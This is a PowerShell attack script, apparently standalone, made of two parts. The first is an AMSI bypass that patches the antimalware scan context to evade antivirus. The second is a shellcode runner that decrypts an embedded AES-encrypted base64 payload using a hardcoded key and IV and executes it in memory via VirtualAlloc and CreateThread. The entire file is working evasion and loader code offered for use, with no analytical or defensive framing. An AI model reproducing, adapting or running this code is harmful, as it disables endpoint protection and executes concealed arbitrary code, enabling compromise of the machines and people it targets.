# ========================
# AMSI BYPASS (Avoids antivirus detection)
# ========================

$a=[Ref].Assembly.GetTypes()|?{$_.Name-like'*siUtils'};
$b=$a.GetFields('NonPublic,Static')|?{$_.Name-like'*siContext'};
[IntPtr]$c=$b.GetValue($null);
[Int32[]]$d=@(0xff);
[System.Runtime.InteropServices.Marshal]::Copy($d,0,$c,1)

# ========================
# SHELLCODE RUNNER
# ========================

function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
            DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

function Decrypt-Bytes($encrypted_b64, $key, $iv) {
    $encrypted_bytes = [Convert]::FromBase64String($encrypted_b64)

    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Key = $key  # Key as bytes
    $aes.IV = $iv    # IV as bytes

    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
    $decrypted_bytes = $decryptor.TransformFinalBlock($encrypted_bytes, 0, $encrypted_bytes.Length)
    $aes.Dispose()

    return $decrypted_bytes
}

# ========================
# AES-256 KEY AND IV (Must match the Python script)
# ========================
[Byte[]] $key = @(0xbe,0x18,0xfd,0xe4,0xaf,0x91,0x18,0x71,0xcc,0x26,0xde,0x78,0x96,0x7f,0x9e,0x8d,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xaa,0xbb,0xcc,0xdd,0xee,0xff,0x11,0x22,0x33)
[Byte[]] $iv  = @(0x30,0x84,0x61,0x75,0x58,0x11,0x4e,0x0e,0xab,0xa5,0x65,0x42,0x2c,0xf0,0x4c,0x18)

# ========================
# EMBEDDED ENCRYPTED SHELLCODE (Base64)
# ========================
$encrypted_payload = @'
qBrLeywX/Gvd2bH8JS7NuMyV5TI68x6Vx+X5SXhvWnj9D2D8QJF7rloSoPJIxOLhYV239BTniMghlMMm6GCZI+zqTTf3zTATXAJsQYButjfoxr6YzpTNYsv2pSViYUl1isPXXwzTI0bK4QjuKzwLDooGbbsF/rWRsPsMGis4kzW7jsOqfReyZ5/8sA2ctPFNhUDYyZ5fXwHOCBILJk1pJMLG3ZZ8RWkuVy/n9ChJaDOleRdOV9PDQtSWvVGhO+lISRytieUy63KLma+7zUp8VP/ngnno5p6+txvk56p7e+EQOkQLdL+QDcIh6r/Jsj2W3bhfyXeQFYnUR/wl9wJfHB5BTBCmX/NT36rtePNHntJvzFtcECQbis9jInz2EZ6ls0THzOXs+BA817PV8EKRvQrNyitDGTRrlQTMVadtKbs/fDUMaySne7PLYzmhISiKsNERrHIier7wcGe6VTVBlccc7wD4qxh42KpBR5v7Qq6Sc+Iev9Zwbs+pLUTQBSLVEQ2HAc/aaPJA7iLjDM15EekP1/fcLuEcOocITamV7YW69MVIBU659IRdTaZCsw9Xca/bcN+yAlBPpA+LUU1wQSUvCwGBpieVucK0TVe0IB05Yw3ulYMoFRozwwKWYADvvLrFgMk71ePoAOaqjp8cgZff759X7+/0/WrLsAgCwqECp+74sQ8HwzuD4cui8vKWLOk1ZxDsBnwQJW29mG1Jq90+79lEvqsI4wxJTE9tBG2W8C+yMN9j09Fq8ZQsADMpVxmGM4/k8QYuukWQ27iRiMPi601Az+cexiU2vQQGoMLm79/Md/MU8RLmWe7oDDLJT1wRQ4rLh8SOs3odAV2QgKU3SKyrN0SKBVq7kjH9gY3RwctDfHAHGAvv03ruHR+tdIYkvS47PLfJgIfJfRgsjAVIY4cWAmGDPwNQLAbL5km383xWsoTLYxKJwDuhKhqqqi8D7Q5QkMXSmijx8UCSrmqghyeffPqfUJDZR1Qd8Paek2arXsZm9UulIPdpH033zUNIjFuTU68cybv96zFb1hyP7qT8cru5+L/6RqFlPkfK4fPzNqOOLDcnODOzYtNllW9r7qbq+ASq1Fh/YwW/4w==
'@

# ========================
# SHELLCODE DECRYPTION
# ========================
$buf = Decrypt-Bytes -encrypted_b64 $encrypted_payload -key $key -iv $iv

# ========================
# EXECUTION OF SHELLCODE IN MEMORY
# ========================
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.Length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
